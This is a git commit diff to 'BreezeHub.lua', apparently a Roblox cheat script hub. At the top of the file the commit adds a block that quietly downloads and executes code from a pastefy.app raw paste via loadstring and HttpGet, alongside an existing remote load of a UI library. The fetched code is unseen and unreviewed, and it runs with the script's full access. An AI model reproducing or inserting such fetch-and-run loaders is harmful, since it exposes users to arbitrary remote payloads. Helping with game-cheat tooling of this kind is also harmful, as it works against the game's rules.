f5c995716408df2cea95456a6a1ab45a1c6cabbf
barbarianTopG <134774093+barbarianTopG@users.noreply.github.com>
2025-10-04 12:48:34 +1000

    Update BreezeHub.lua

--- BreezeHub.lua
+++ BreezeHub.lua
@@ -1,3 +1,9 @@
+pcall(function()
+    if not shared.FunctionPatchesForTrashExecutor == true then
+        loadstring(game:HttpGet("https://pastefy.app/TL0PGJ2Z/raw"))()
+        shared.FunctionPatchesForTrashExecutor = true
+    end
+end)
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 local Window = Rayfield:CreateWindow({
